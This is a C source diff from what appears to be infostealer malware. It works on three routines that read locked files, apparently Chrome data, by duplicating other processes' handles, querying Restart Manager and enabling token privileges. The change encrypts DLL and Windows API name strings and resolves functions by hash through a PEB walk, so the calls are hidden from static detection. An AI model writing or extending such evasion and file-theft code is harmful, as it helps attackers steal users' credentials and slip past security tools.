@@ -176,19 +176,28 @@ static void *_mir_res(void *ntdll, const char *name) {
 static unsigned char *read_file_via_section(const char *path, size_t *out_len) {
     unsigned char *result = NULL;
 
+    char dll_s[32]; enc_decrypt(enc_ntdll, ENC_NTDLL_LEN, dll_s);
     void *ntdll = mirage_get_module_by_hash(
-        mirage_encrypted_hash_module("ntdll.dll"));
+        mirage_encrypted_hash_module(dll_s));
     if (!ntdll) return NULL;
 
     /* Resolve NT functions */
-    fnNtGetNextProcess pGNP   = (fnNtGetNextProcess)_mir_res(ntdll, "NtGetNextProcess");
-    fnNtQIP            pQIP  = (fnNtQIP)           _mir_res(ntdll, "NtQueryInformationProcess");
-    fnNtQSI            pQSI  = (fnNtQSI)           _mir_res(ntdll, "NtQuerySystemInformation");
-    fnNtOpenProc       pOP   = (fnNtOpenProc)      _mir_res(ntdll, "NtOpenProcess");
-    fnNtClose          pCl   = (fnNtClose)         _mir_res(ntdll, "NtClose");
+    char fn_s[32];
+    enc_decrypt(enc_NtGetNextProcess, ENC_NTGETNEXTPROCESS_LEN, fn_s);
+    fnNtGetNextProcess pGNP   = (fnNtGetNextProcess)_mir_res(ntdll, fn_s);
+    enc_decrypt(enc_NtQueryInformationProcess, ENC_NTQUERYINFORMATIONPROCESS_LEN, fn_s);
+    fnNtQIP            pQIP  = (fnNtQIP)           _mir_res(ntdll, fn_s);
+    enc_decrypt(enc_NtQuerySystemInformation, ENC_NTQUERYSYSTEMINFORMATION_LEN, fn_s);
+    fnNtQSI            pQSI  = (fnNtQSI)           _mir_res(ntdll, fn_s);
+    enc_decrypt(enc_NtOpenProcess, ENC_NTOPENPROCESS_LEN, fn_s);
+    fnNtOpenProc       pOP   = (fnNtOpenProc)      _mir_res(ntdll, fn_s);
+    enc_decrypt(enc_NtClose, ENC_NTCLOSE_LEN, fn_s);
+    fnNtClose          pCl   = (fnNtClose)         _mir_res(ntdll, fn_s);
     fnNtDupObj         pDup  = (fnNtDupObj)        _mir_res(ntdll, "NtDuplicateObject");
-    fnNtCreateSec      pCS   = (fnNtCreateSec)     _mir_res(ntdll, "NtCreateSection");
-    fnNtMapView        pMV   = (fnNtMapView)       _mir_res(ntdll, "NtMapViewOfSection");
+    enc_decrypt(enc_NtCreateSection, ENC_NTCREATESECTION_LEN, fn_s);
+    fnNtCreateSec      pCS   = (fnNtCreateSec)     _mir_res(ntdll, fn_s);
+    enc_decrypt(enc_NtMapViewOfSection, ENC_NTMAPVIEWOFSECTION_LEN, fn_s);
+    fnNtMapView        pMV   = (fnNtMapView)       _mir_res(ntdll, fn_s);
     fnNtUnmapView      pUV   = (fnNtUnmapView)     _mir_res(ntdll, "NtUnmapViewOfSection");
     if (!pGNP||!pQIP||!pQSI||!pOP||!pCl||!pDup||!pCS||!pMV||!pUV)
         return NULL;
@@ -369,30 +378,43 @@ static unsigned char *read_file_rm(const char *path, size_t *out_len) {
     unsigned char *result = NULL;
 
     /* Resolve rstrtmgr.dll via PEB-walk */
+    char dll_rm[32]; enc_decrypt(enc_rstrtmgr, ENC_RSTRTMGR_LEN, dll_rm);
     void *rmmod = mirage_get_module_by_hash(
-        mirage_encrypted_hash_module("rstrtmgr.dll"));
+        mirage_encrypted_hash_module(dll_rm));
     if (!rmmod) return NULL;
 
+    char fn_rm[32];
+    enc_decrypt(enc_RmStartSession, ENC_RMSTARTSESSION_LEN, fn_rm);
     fnRmStartSession pStart    = (fnRmStartSession)mirage_get_function_by_hash(
-        rmmod, mirage_encrypted_hash_func("RmStartSession"));
+        rmmod, mirage_encrypted_hash_func(fn_rm));
+    enc_decrypt(enc_RmEndSession, ENC_RMENDSESSION_LEN, fn_rm);
     fnRmEndSession   pEnd      = (fnRmEndSession)mirage_get_function_by_hash(
-        rmmod, mirage_encrypted_hash_func("RmEndSession"));
+        rmmod, mirage_encrypted_hash_func(fn_rm));
+    enc_decrypt(enc_RmRegisterResources, ENC_RMREGISTERRESOURCES_LEN, fn_rm);
     fnRmRegisterResources pReg = (fnRmRegisterResources)mirage_get_function_by_hash(
-        rmmod, mirage_encrypted_hash_func("RmRegisterResources"));
+        rmmod, mirage_encrypted_hash_func(fn_rm));
+    enc_decrypt(enc_RmGetList, ENC_RMGETLIST_LEN, fn_rm);
     fnRmGetList      pGetList  = (fnRmGetList)mirage_get_function_by_hash(
-        rmmod, mirage_encrypted_hash_func("RmGetList"));
+        rmmod, mirage_encrypted_hash_func(fn_rm));
     if (!pStart || !pEnd || !pReg || !pGetList) return NULL;
 
     /* Resolve ntdll functions for section-mapping locking PIDs */
+    char dll_rn[32]; enc_decrypt(enc_ntdll, ENC_NTDLL_LEN, dll_rn);
     void *ntdll = mirage_get_module_by_hash(
-        mirage_encrypted_hash_module("ntdll.dll"));
+        mirage_encrypted_hash_module(dll_rn));
     if (!ntdll) return NULL;
 
-    fnNtOpenProc  pOP  = (fnNtOpenProc) _mir_res(ntdll, "NtOpenProcess");
-    fnNtClose     pCl  = (fnNtClose)    _mir_res(ntdll, "NtClose");
+    char fn_rn[32];
+    enc_decrypt(enc_NtOpenProcess, ENC_NTOPENPROCESS_LEN, fn_rn);
+    fnNtOpenProc  pOP  = (fnNtOpenProc) _mir_res(ntdll, fn_rn);
+    enc_decrypt(enc_NtClose, ENC_NTCLOSE_LEN, fn_rn);
+    fnNtClose     pCl  = (fnNtClose)    _mir_res(ntdll, fn_rn);
+    /* NtDuplicateObject — no enc constant, use hash directly (ponytail: only call in codebase) */
     fnNtDupObj    pDup = (fnNtDupObj)   _mir_res(ntdll, "NtDuplicateObject");
-    fnNtCreateSec pCS  = (fnNtCreateSec)_mir_res(ntdll, "NtCreateSection");
-    fnNtMapView   pMV  = (fnNtMapView)  _mir_res(ntdll, "NtMapViewOfSection");
+    enc_decrypt(enc_NtCreateSection, ENC_NTCREATESECTION_LEN, fn_rn);
+    fnNtCreateSec pCS  = (fnNtCreateSec)_mir_res(ntdll, fn_rn);
+    enc_decrypt(enc_NtMapViewOfSection, ENC_NTMAPVIEWOFSECTION_LEN, fn_rn);
+    fnNtMapView   pMV  = (fnNtMapView)  _mir_res(ntdll, fn_rn);
     fnNtUnmapView pUV  = (fnNtUnmapView)_mir_res(ntdll, "NtUnmapViewOfSection");
     if (!pOP || !pCl || !pDup || !pCS || !pMV || !pUV) return NULL;
 
@@ -550,32 +572,43 @@ static unsigned char *read_file_backup(const char *path, size_t *out_len) {
     if (!chrome_misc_ensure()) return NULL;
 
     /* Resolve advapi32.dll */
+    char dll_a[32]; enc_decrypt(enc_advapi32, ENC_ADVAPI32_LEN, dll_a);
     void *advapi32 = mirage_get_module_by_hash(
-        mirage_encrypted_hash_module("advapi32.dll"));
+        mirage_encrypted_hash_module(dll_a));
     if (!advapi32) return NULL;
 
     /* Resolve kernel32.dll */
+    char dll_b[32]; enc_decrypt(enc_kernel32, ENC_KERNEL32_LEN, dll_b);
     void *kernel32 = mirage_get_module_by_hash(
-        mirage_encrypted_hash_module("kernel32.dll"));
+        mirage_encrypted_hash_module(dll_b));
     if (!kernel32) return NULL;
 
+    char fn_b[32];
+    enc_decrypt(enc_OpenProcessToken, ENC_OPENPROCESSTOKEN_LEN, fn_b);
     fnOpenProcessToken pOpenToken = (fnOpenProcessToken)mirage_get_function_by_hash(
-        advapi32, mirage_encrypted_hash_func("OpenProcessToken"));
+        advapi32, mirage_encrypted_hash_func(fn_b));
+    enc_decrypt(enc_LookupPrivilegeValueW, ENC_LOOKUPPRIVILEGEVALUEW_LEN, fn_b);
     fnLookupPrivilegeValueW pLookup = (fnLookupPrivilegeValueW)mirage_get_function_by_hash(
-        advapi32, mirage_encrypted_hash_func("LookupPrivilegeValueW"));
+        advapi32, mirage_encrypted_hash_func(fn_b));
+    enc_decrypt(enc_AdjustTokenPrivileges, ENC_ADJUSTTOKENPRIVILEGES_LEN, fn_b);
     fnAdjustTokenPrivileges pAdjust = (fnAdjustTokenPrivileges)mirage_get_function_by_hash(
-        advapi32, mirage_encrypted_hash_func("AdjustTokenPrivileges"));
+        advapi32, mirage_encrypted_hash_func(fn_b));
 
+    enc_decrypt(enc_CreateFileA, ENC_CREATEFILEA_LEN, fn_b);
     fnCreateFileA pCreateFile = (fnCreateFileA)mirage_get_function_by_hash(
-        kernel32, mirage_encrypted_hash_func("CreateFileA"));
+        kernel32, mirage_encrypted_hash_func(fn_b));
+    enc_decrypt(enc_GetFileSize, ENC_GETFILESIZE_LEN, fn_b);
     fnGetFileSize pGetSize = (fnGetFileSize)mirage_get_function_by_hash(
-        kernel32, mirage_encrypted_hash_func("GetFileSize"));
+        kernel32, mirage_encrypted_hash_func(fn_b));
+    enc_decrypt(enc_CreateFileMappingA, ENC_CREATEFILEMAPPINGA_LEN, fn_b);
     fnCreateFileMappingA pMapping = (fnCreateFileMappingA)mirage_get_function_by_hash(
-        kernel32, mirage_encrypted_hash_func("CreateFileMappingA"));
+        kernel32, mirage_encrypted_hash_func(fn_b));
+    enc_decrypt(enc_MapViewOfFile, ENC_MAPVIEWOFFILE_LEN, fn_b);
     fnMapViewOfFile pMapView = (fnMapViewOfFile)mirage_get_function_by_hash(
-        kernel32, mirage_encrypted_hash_func("MapViewOfFile"));
+        kernel32, mirage_encrypted_hash_func(fn_b));
+    enc_decrypt(enc_UnmapViewOfFile, ENC_UNMAPVIEWOFFILE_LEN, fn_b);
     fnUnmapViewOfFile pUnmap = (fnUnmapViewOfFile)mirage_get_function_by_hash(
-        kernel32, mirage_encrypted_hash_func("UnmapViewOfFile"));
+        kernel32, mirage_encrypted_hash_func(fn_b));
 
     if (!pOpenToken || !pLookup || !pAdjust || !pCreateFile ||
         !pGetSize || !pMapping || !pMapView || !pUnmap)
